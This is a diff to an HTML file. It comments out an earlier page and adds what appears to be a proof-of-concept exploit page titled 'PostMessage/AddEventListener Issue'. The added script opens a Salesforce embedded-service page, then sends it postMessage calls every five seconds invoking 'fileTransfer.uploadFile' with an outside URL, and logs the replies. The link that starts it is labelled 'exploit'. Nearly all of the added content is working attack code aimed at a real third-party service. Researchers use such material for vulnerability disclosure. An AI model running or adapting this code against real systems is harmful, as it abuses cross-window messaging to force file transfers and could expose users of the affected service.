@@ -1,5 +1,5 @@
 
-<html>
+<!-- <html>
   <head><meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1"></head>
   <body>
   <p><a id="editThisPageLink" target="_blank" style="color:blue">Edit this page</a></p>
@@ -73,4 +73,28 @@
 	}
 </script>
   </body>
+</html> -->
+
+<html>
+<head>
+<script>
+    
+var b;
+function xss() {
+    setInterval(function() {
+        b.postMessage({"method":"fileTransfer.uploadFile","domain":"esw1234.github.io","data":{"url":"http://14.rs"}},'*');
+        window.addEventListener("message",function(e)
+        {
+          console.log(e.data);
+        })
+    }, 
+    5000);
+}
+</script>
+</head>
+<body>
+  <center>
+    <h2>PostMessage/AddEventListener Issue</h2>
+    <a href="#" onclick="b=window.open('https://service.force.com/embeddedservice/2.0/esw.html?parent=https://esw1234.github.io','b','_blank'); xss(); return false;" target="_blank">exploit</a></body>
+  </center>
 </html>
